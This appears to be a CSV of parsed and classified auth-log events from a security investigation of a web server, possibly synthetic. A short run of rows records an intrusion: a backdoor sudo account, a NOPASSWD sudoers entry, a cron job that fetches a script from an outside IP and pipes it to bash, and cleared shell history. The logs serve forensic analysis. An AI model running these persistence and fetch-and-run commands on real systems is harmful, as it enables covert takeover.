event_id,investigation_id,evidence_file_id,line_number,timestamp,hostname,process,process_id,event_type,event_category,username,target_username,source_ip,source_port,authentication_method,command,result,raw_message,classification,severity,confidence,matched_rule_ids,parsing_error,created_at
event-96a497ebb0cf,inv-248600b1fbdc,file-82f07ce6a1e7,183,2026-03-10T03:45:16,webserver01,sshd,1635,ssh_session_opened,session,backup,,,,,,success,pam_unix(sshd:session): session opened for user backup by (uid=0),Normal,Informational,0.5,[],,2026-08-03T16:44:07.815818
event-b6c6e2a91b94,inv-248600b1fbdc,file-82f07ce6a1e7,184,2026-03-10T03:45:16,webserver01,systemd-logind,612,unparsed,unknown,,,,,,,,New session 925 of user backup.,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.815915
event-3ceef580e984,inv-248600b1fbdc,file-82f07ce6a1e7,185,2026-03-10T03:45:36,webserver01,sudo,,sudo_command,privilege,backup,,,,,/usr/bin/id,success,backup : TTY=pts/2 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/id,Normal,Informational,0.5,[],,2026-08-03T16:44:07.816014
event-61293a2b19cf,inv-248600b1fbdc,file-82f07ce6a1e7,186,2026-03-10T03:45:41,webserver01,sudo,,sudoers_modified,privilege,backup,,,,,/usr/bin/cat /etc/sudoers,success,backup : TTY=pts/2 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/cat /etc/sudoers,Critical,High,0.5,['PRIV-003'],,2026-08-03T16:44:07.816113
event-f897ebd6baaf,inv-248600b1fbdc,file-82f07ce6a1e7,187,2026-03-10T03:46:21,webserver01,sudo,,sudo_command,privilege,backup,,,,,/bin/bash,success,backup : TTY=pts/2 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash,Critical,High,0.5,['PRIV-001'],,2026-08-03T16:44:07.816217
event-5c8a1c7f3d66,inv-248600b1fbdc,file-82f07ce6a1e7,188,2026-03-10T03:46:21,webserver01,sudo,,unparsed,unknown,,,,,,,,pam_unix(sudo:session): session opened for user root by backup(uid=1001),Unknown,Informational,0.5,[],,2026-08-03T16:44:07.816319
event-231eac15539e,inv-248600b1fbdc,file-82f07ce6a1e7,189,2026-03-10T03:47:11,webserver01,useradd,1639,unparsed,unknown,,,,,,,,"new group: name=sysupdate, GID=1002",Unknown,Informational,0.5,[],,2026-08-03T16:44:07.816441
event-dc57123166a1,inv-248600b1fbdc,file-82f07ce6a1e7,190,2026-03-10T03:47:11,webserver01,useradd,1639,user_created,account,sysupdate,,,,,,success,"new user: name=sysupdate, UID=1002, GID=1002, home=/home/sysupdate, shell=/bin/bash",Suspicious,Medium,0.5,['ACCOUNT-001'],,2026-08-03T16:44:07.816538
event-89042fb641ad,inv-248600b1fbdc,file-82f07ce6a1e7,191,2026-03-10T03:47:19,webserver01,passwd,1642,password_changed,account,sysupdate,,,,,,success,pam_unix(passwd:chauthtok): password changed for sysupdate,Normal,Informational,0.5,[],,2026-08-03T16:44:07.816679
event-7e494fff7090,inv-248600b1fbdc,file-82f07ce6a1e7,192,2026-03-10T03:47:31,webserver01,sudo,,sudo_command,privilege,backup,,,,,/usr/sbin/usermod -aG sudo sysupdate,success,backup : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo sysupdate,Normal,Informational,0.5,[],,2026-08-03T16:44:07.816801
event-57561476ffc8,inv-248600b1fbdc,file-82f07ce6a1e7,193,2026-03-10T03:47:46,webserver01,sudo,,sudoers_modified,privilege,backup,,,,,"/bin/sh -c ""echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers""",success,"backup : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c ""echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers""",Critical,High,0.5,['PRIV-003'],,2026-08-03T16:44:07.816902
event-376b861df974,inv-248600b1fbdc,file-82f07ce6a1e7,194,2026-03-10T03:48:16,webserver01,sudo,,cron_modified,persistence,backup,,,,,/usr/bin/crontab -l,success,backup : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/crontab -l,Critical,High,0.5,['PERSIST-001'],,2026-08-03T16:44:07.817015
event-6f7641f56fee,inv-248600b1fbdc,file-82f07ce6a1e7,195,2026-03-10T03:48:26,webserver01,sudo,,cron_modified,persistence,backup,,,,,"/bin/sh -c ""(crontab -l; echo '*/10 * * * * curl -s http://192.0.2.99/update.sh | bash') | crontab -""",success,"backup : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c ""(crontab -l; echo '*/10 * * * * curl -s http://192.0.2.99/update.sh | bash') | crontab -""",Critical,High,0.5,"['PERSIST-002', 'PERSIST-001']",,2026-08-03T16:44:07.817126
event-014fb14d678a,inv-248600b1fbdc,file-82f07ce6a1e7,196,2026-03-10T03:48:51,webserver01,sudo,,history_cleared,defense_evasion,backup,,,,,"/bin/sh -c ""echo > /home/backup/.bash_history""",success,"backup : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c ""echo > /home/backup/.bash_history""",Suspicious,Medium,0.5,['EVASION-001'],,2026-08-03T16:44:07.817241
event-3e99bbd23efd,inv-248600b1fbdc,file-82f07ce6a1e7,197,2026-03-10T03:48:59,webserver01,sudo,,history_cleared,defense_evasion,backup,,,,,/usr/bin/history -c,success,backup : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/history -c,Suspicious,Medium,0.5,['EVASION-001'],,2026-08-03T16:44:07.817354
event-64a6b6a403be,inv-248600b1fbdc,file-82f07ce6a1e7,198,2026-03-10T03:49:19,webserver01,sshd,1635,ssh_session_closed,session,backup,,,,,,success,pam_unix(sshd:session): session closed for user backup,Normal,Informational,0.5,[],,2026-08-03T16:44:07.817456
event-3f1182b67f32,inv-248600b1fbdc,file-82f07ce6a1e7,199,2026-03-10T03:49:19,webserver01,systemd-logind,612,unparsed,unknown,,,,,,,,Session 125 logged out. Waiting for processes to exit.,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.817555
event-0831bbfe766d,inv-248600b1fbdc,file-82f07ce6a1e7,200,2026-03-10T06:03:19,webserver01,sshd,1643,ssh_accepted,authentication,sysupdate,,198.51.100.23,48023,password,,success,Accepted password for sysupdate from 198.51.100.23 port 48023 ssh2,Critical,High,0.5,['AUTH-005'],,2026-08-03T16:44:07.817660
event-ac136feaa421,inv-248600b1fbdc,file-82f07ce6a1e7,201,2026-03-10T06:03:19,webserver01,sshd,1643,ssh_session_opened,session,sysupdate,,,,,,success,pam_unix(sshd:session): session opened for user sysupdate by (uid=0),Normal,Informational,0.5,[],,2026-08-03T16:44:07.817758
event-dcf87019fb04,inv-248600b1fbdc,file-82f07ce6a1e7,202,2026-03-10T06:33:19,webserver01,sshd,1643,ssh_session_closed,session,sysupdate,,,,,,success,pam_unix(sshd:session): session closed for user sysupdate,Normal,Informational,0.5,[],,2026-08-03T16:44:07.817853
event-b623e180b1d6,inv-248600b1fbdc,file-82f07ce6a1e7,203,2026-03-10T07:06:00,webserver01,sudo,,sudo_command,privilege,ubuntu,,,,,/usr/bin/apt update,success,ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update,Normal,Informational,0.5,[],,2026-08-03T16:44:07.817946
event-068642498f36,inv-248600b1fbdc,file-82f07ce6a1e7,204,2026-03-10T07:21:00,webserver01,CRON,1284,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.818052
event-fe3205916f90,inv-248600b1fbdc,file-82f07ce6a1e7,205,2026-03-10T07:32:00,webserver01,sudo,,sudo_command,privilege,deploy,,,,,/usr/bin/apt update,success,deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt update,Normal,Informational,0.5,[],,2026-08-03T16:44:07.818161
event-3117a7c748e6,inv-248600b1fbdc,file-82f07ce6a1e7,206,2026-03-10T07:39:00,webserver01,sudo,,sudo_command,privilege,ubuntu,,,,,/usr/bin/systemctl restart nginx,success,ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx,Normal,Informational,0.5,[],,2026-08-03T16:44:07.818256
event-0b6d626fbb17,inv-248600b1fbdc,file-82f07ce6a1e7,207,2026-03-10T08:16:00,webserver01,systemd-logind,612,unparsed,unknown,,,,,,,,New session 871 of user ubuntu.,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.818360
event-1c9b5d863cd1,inv-248600b1fbdc,file-82f07ce6a1e7,208,2026-03-10T08:29:00,webserver01,sudo,,sudo_command,privilege,ubuntu,,,,,/usr/bin/df -h,success,ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/df -h,Normal,Informational,0.5,[],,2026-08-03T16:44:07.818462
event-95b84cea18c9,inv-248600b1fbdc,file-82f07ce6a1e7,209,2026-03-10T08:35:00,webserver01,CRON,1309,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.818562
event-58b5c2782ead,inv-248600b1fbdc,file-82f07ce6a1e7,210,2026-03-10T09:02:00,webserver01,CRON,1317,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.818681
event-82ab4dfa0826,inv-248600b1fbdc,file-82f07ce6a1e7,211,2026-03-10T09:23:00,webserver01,sudo,,sudo_command,privilege,aritra,,,,,/usr/bin/df -h,success,aritra : TTY=pts/0 ; PWD=/home/aritra ; USER=root ; COMMAND=/usr/bin/df -h,Normal,Informational,0.5,[],,2026-08-03T16:44:07.818790
event-2964ad61034f,inv-248600b1fbdc,file-82f07ce6a1e7,212,2026-03-10T09:35:00,webserver01,CRON,1330,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.818896
event-48f67a15a163,inv-248600b1fbdc,file-82f07ce6a1e7,213,2026-03-10T09:41:00,webserver01,sshd,1339,ssh_session_closed,session,ubuntu,,,,,,success,pam_unix(sshd:session): session closed for user ubuntu,Normal,Informational,0.5,[],,2026-08-03T16:44:07.819019
event-e48ef364f1c2,inv-248600b1fbdc,file-82f07ce6a1e7,214,2026-03-10T10:04:00,webserver01,CRON,1347,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.819119
event-1cc538c6179e,inv-248600b1fbdc,file-82f07ce6a1e7,215,2026-03-10T10:39:00,webserver01,systemd-logind,612,unparsed,unknown,,,,,,,,New session 261 of user ubuntu.,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.819237
event-634c52ca92cb,inv-248600b1fbdc,file-82f07ce6a1e7,216,2026-03-10T11:14:00,webserver01,CRON,1359,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.819331
event-f8477b06c9f4,inv-248600b1fbdc,file-82f07ce6a1e7,217,2026-03-10T11:21:00,webserver01,sshd,1363,ssh_session_closed,session,deploy,,,,,,success,pam_unix(sshd:session): session closed for user deploy,Normal,Informational,0.5,[],,2026-08-03T16:44:07.819454
event-463608956a73,inv-248600b1fbdc,file-82f07ce6a1e7,218,2026-03-10T11:31:00,webserver01,systemd-logind,612,unparsed,unknown,,,,,,,,New session 692 of user aritra.,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.819550
event-c8cd5a87a42b,inv-248600b1fbdc,file-82f07ce6a1e7,219,2026-03-10T11:36:00,webserver01,sshd,1374,ssh_session_closed,session,aritra,,,,,,success,pam_unix(sshd:session): session closed for user aritra,Normal,Informational,0.5,[],,2026-08-03T16:44:07.819641
event-570645feeb9e,inv-248600b1fbdc,file-82f07ce6a1e7,220,2026-03-10T12:10:00,webserver01,sshd,1394,ssh_failed_password,authentication,root,,198.51.100.23,54982,,,failed,Failed password for root from 198.51.100.23 port 54982 ssh2,Suspicious,Low,0.5,[],,2026-08-03T16:44:07.819737
event-46a9b1c3c3fe,inv-248600b1fbdc,file-82f07ce6a1e7,221,2026-03-10T12:16:00,webserver01,sshd,1380,ssh_session_closed,session,deploy,,,,,,success,pam_unix(sshd:session): session closed for user deploy,Normal,Informational,0.5,[],,2026-08-03T16:44:07.819830
event-dd608963257a,inv-248600b1fbdc,file-82f07ce6a1e7,222,2026-03-10T12:32:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Starting Daily apt download activities...,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.819931
event-6a4f2f20a279,inv-248600b1fbdc,file-82f07ce6a1e7,223,2026-03-10T12:40:00,webserver01,sshd,1396,ssh_failed_password,authentication,admin,,198.51.100.23,40305,,,failed,Failed password for admin from 198.51.100.23 port 40305 ssh2,Suspicious,Low,0.5,[],,2026-08-03T16:44:07.820073
event-19f0bc71c86c,inv-248600b1fbdc,file-82f07ce6a1e7,224,2026-03-10T12:50:00,webserver01,CRON,1389,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.820171
event-592e3f1d80d8,inv-248600b1fbdc,file-82f07ce6a1e7,225,2026-03-10T17:07:00,webserver01,sshd,1647,ssh_accepted,authentication,aritra,,203.0.113.22,56199,publickey,,success,Accepted publickey for aritra from 203.0.113.22 port 56199 ssh2: RSA SHA256:9fK2j...,Normal,Informational,0.5,[],,2026-08-03T16:44:07.820288
event-d9af150f114f,inv-248600b1fbdc,file-82f07ce6a1e7,226,2026-03-10T17:07:00,webserver01,sshd,1647,ssh_session_opened,session,aritra,,,,,,success,pam_unix(sshd:session): session opened for user aritra by (uid=0),Normal,Informational,0.5,[],,2026-08-03T16:44:07.820391
event-b51b48380a30,inv-248600b1fbdc,file-82f07ce6a1e7,227,2026-03-10T17:35:00,webserver01,CRON,1648,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.820485
event-6684877e6456,inv-248600b1fbdc,file-82f07ce6a1e7,228,2026-03-10T17:44:00,webserver01,systemd-logind,612,unparsed,unknown,,,,,,,,New session 280 of user aritra.,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.820597
event-aa9212e7c630,inv-248600b1fbdc,file-82f07ce6a1e7,229,2026-03-10T18:20:00,webserver01,sshd,1661,ssh_accepted,authentication,ubuntu,,203.0.113.7,54957,publickey,,success,Accepted publickey for ubuntu from 203.0.113.7 port 54957 ssh2: RSA SHA256:9fK2j...,Normal,Informational,0.5,[],,2026-08-03T16:44:07.820689
event-d1785b1f665a,inv-248600b1fbdc,file-82f07ce6a1e7,230,2026-03-10T18:20:00,webserver01,sshd,1661,ssh_session_opened,session,ubuntu,,,,,,success,pam_unix(sshd:session): session opened for user ubuntu by (uid=0),Normal,Informational,0.5,[],,2026-08-03T16:44:07.820790
event-94caa0c24470,inv-248600b1fbdc,file-82f07ce6a1e7,231,2026-03-10T18:31:00,webserver01,systemd-logind,612,unparsed,unknown,,,,,,,,New session 672 of user aritra.,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.820902
event-e09a824ec6ae,inv-248600b1fbdc,file-82f07ce6a1e7,232,2026-03-10T18:54:00,webserver01,systemd-logind,612,unparsed,unknown,,,,,,,,New session 727 of user aritra.,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.821007
event-b6c4ccae4f4b,inv-248600b1fbdc,file-82f07ce6a1e7,233,2026-03-10T19:29:00,webserver01,sudo,,sudo_command,privilege,deploy,,,,,/usr/bin/apt update,success,deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt update,Normal,Informational,0.5,[],,2026-08-03T16:44:07.821108
event-4239eb6b895c,inv-248600b1fbdc,file-82f07ce6a1e7,234,2026-03-10T20:02:00,webserver01,sshd,1691,ssh_accepted,authentication,aritra,,203.0.113.22,57081,publickey,,success,Accepted publickey for aritra from 203.0.113.22 port 57081 ssh2: RSA SHA256:9fK2j...,Normal,Informational,0.5,[],,2026-08-03T16:44:07.821225
event-329195280e65,inv-248600b1fbdc,file-82f07ce6a1e7,235,2026-03-10T20:02:00,webserver01,sshd,1691,ssh_session_opened,session,aritra,,,,,,success,pam_unix(sshd:session): session opened for user aritra by (uid=0),Normal,Informational,0.5,[],,2026-08-03T16:44:07.821322
event-a3b3a3eed16e,inv-248600b1fbdc,file-82f07ce6a1e7,236,2026-03-10T20:36:00,webserver01,sshd,1696,ssh_session_closed,session,deploy,,,,,,success,pam_unix(sshd:session): session closed for user deploy,Normal,Informational,0.5,[],,2026-08-03T16:44:07.821427
event-7fdb3a68ede8,inv-248600b1fbdc,file-82f07ce6a1e7,237,2026-03-10T20:43:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Starting Daily apt download activities...,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.821532
event-99e7e7fe8f2d,inv-248600b1fbdc,file-82f07ce6a1e7,238,2026-03-10T21:03:00,webserver01,sudo,,sudo_command,privilege,ubuntu,,,,,/usr/bin/apt update,success,ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update,Normal,Informational,0.5,[],,2026-08-03T16:44:07.821640
event-27e4cdb574fe,inv-248600b1fbdc,file-82f07ce6a1e7,239,2026-03-10T21:15:00,webserver01,CRON,1712,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.821755
event-ad6562e0e519,inv-248600b1fbdc,file-82f07ce6a1e7,240,2026-03-10T21:31:00,webserver01,CRON,1719,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.821881
event-4df44fb958aa,inv-248600b1fbdc,file-82f07ce6a1e7,241,2026-03-10T21:55:00,webserver01,sshd,1726,ssh_accepted,authentication,ubuntu,,203.0.113.7,53767,publickey,,success,Accepted publickey for ubuntu from 203.0.113.7 port 53767 ssh2: RSA SHA256:9fK2j...,Normal,Informational,0.5,[],,2026-08-03T16:44:07.821994
event-405a3495fc66,inv-248600b1fbdc,file-82f07ce6a1e7,242,2026-03-10T21:55:00,webserver01,sshd,1726,ssh_session_opened,session,ubuntu,,,,,,success,pam_unix(sshd:session): session opened for user ubuntu by (uid=0),Normal,Informational,0.5,[],,2026-08-03T16:44:07.822108
event-d27378ec745b,inv-248600b1fbdc,file-82f07ce6a1e7,243,2026-03-10T22:22:00,webserver01,systemd-logind,612,unparsed,unknown,,,,,,,,New session 977 of user aritra.,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.822206
event-ac3bf847c86e,inv-248600b1fbdc,file-82f07ce6a1e7,244,2026-03-10T22:49:00,webserver01,sshd,1733,ssh_accepted,authentication,deploy,,203.0.113.22,53730,publickey,,success,Accepted publickey for deploy from 203.0.113.22 port 53730 ssh2: RSA SHA256:9fK2j...,Normal,Informational,0.5,[],,2026-08-03T16:44:07.822309
event-0d0ddae125f2,inv-248600b1fbdc,file-82f07ce6a1e7,245,2026-03-10T22:49:00,webserver01,sshd,1733,ssh_session_opened,session,deploy,,,,,,success,pam_unix(sshd:session): session opened for user deploy by (uid=0),Normal,Informational,0.5,[],,2026-08-03T16:44:07.822414
event-036da50a89eb,inv-248600b1fbdc,file-82f07ce6a1e7,246,2026-03-10T23:26:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Starting Daily apt download activities...,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.822520
event-52015943d17d,inv-248600b1fbdc,file-82f07ce6a1e7,247,2026-03-10T23:43:00,webserver01,sshd,1747,ssh_accepted,authentication,deploy,,203.0.113.22,40951,publickey,,success,Accepted publickey for deploy from 203.0.113.22 port 40951 ssh2: RSA SHA256:9fK2j...,Normal,Informational,0.5,[],,2026-08-03T16:44:07.822624
event-5d81b8bdbc65,inv-248600b1fbdc,file-82f07ce6a1e7,248,2026-03-10T23:43:00,webserver01,sshd,1747,ssh_session_opened,session,deploy,,,,,,success,pam_unix(sshd:session): session opened for user deploy by (uid=0),Normal,Informational,0.5,[],,2026-08-03T16:44:07.822776
event-26ab7d9da3e7,inv-248600b1fbdc,file-82f07ce6a1e7,249,2026-03-11T00:10:00,webserver01,sudo,,sudo_command,privilege,aritra,,,,,/usr/bin/apt update,success,aritra : TTY=pts/0 ; PWD=/home/aritra ; USER=root ; COMMAND=/usr/bin/apt update,Normal,Informational,0.5,[],,2026-08-03T16:44:07.822876
event-19c02139686a,inv-248600b1fbdc,file-82f07ce6a1e7,250,2026-03-11T00:42:00,webserver01,systemd-logind,612,unparsed,unknown,,,,,,,,New session 127 of user deploy.,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.822984
event-b6dfa309a7b8,inv-248600b1fbdc,file-82f07ce6a1e7,251,2026-03-11T01:22:00,webserver01,sshd,1764,ssh_session_closed,session,ubuntu,,,,,,success,pam_unix(sshd:session): session closed for user ubuntu,Normal,Informational,0.5,[],,2026-08-03T16:44:07.823083
event-bd919ac86639,inv-248600b1fbdc,file-82f07ce6a1e7,252,2026-03-11T01:52:00,webserver01,CRON,1772,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.823181
event-f3c34112097e,inv-248600b1fbdc,file-82f07ce6a1e7,253,2026-03-11T02:06:00,webserver01,CRON,1779,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.823299
event-1b61bff5693f,inv-248600b1fbdc,file-82f07ce6a1e7,254,2026-03-11T02:29:00,webserver01,CRON,1785,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.823410
event-d207a54c83a2,inv-248600b1fbdc,file-82f07ce6a1e7,255,2026-03-11T02:53:00,webserver01,systemd-logind,612,unparsed,unknown,,,,,,,,New session 384 of user deploy.,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.823522
event-05d845952297,inv-248600b1fbdc,file-82f07ce6a1e7,256,2026-03-11T03:12:00,webserver01,systemd-logind,612,unparsed,unknown,,,,,,,,New session 119 of user aritra.,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.823615
event-b2def16d1904,inv-248600b1fbdc,file-82f07ce6a1e7,257,2026-03-11T03:49:00,webserver01,CRON,1806,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.823707
event-bb6865c75464,inv-248600b1fbdc,file-82f07ce6a1e7,258,2026-03-11T04:06:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Starting Daily apt download activities...,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.823820
event-4140af3d5403,inv-248600b1fbdc,file-82f07ce6a1e7,259,2026-03-11T04:10:00,webserver01,systemd-logind,612,unparsed,unknown,,,,,,,,New session 959 of user ubuntu.,Unknown,Informational,0.5,[],,2026-08-03T16:44:07.823922
event-98d3414a9ca6,inv-248600b1fbdc,file-82f07ce6a1e7,260,2026-03-11T04:22:00,webserver01,CRON,1819,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet,success,(root) CMD (/usr/bin/certbot renew --quiet),Normal,Informational,0.5,[],,2026-08-03T16:44:07.824026
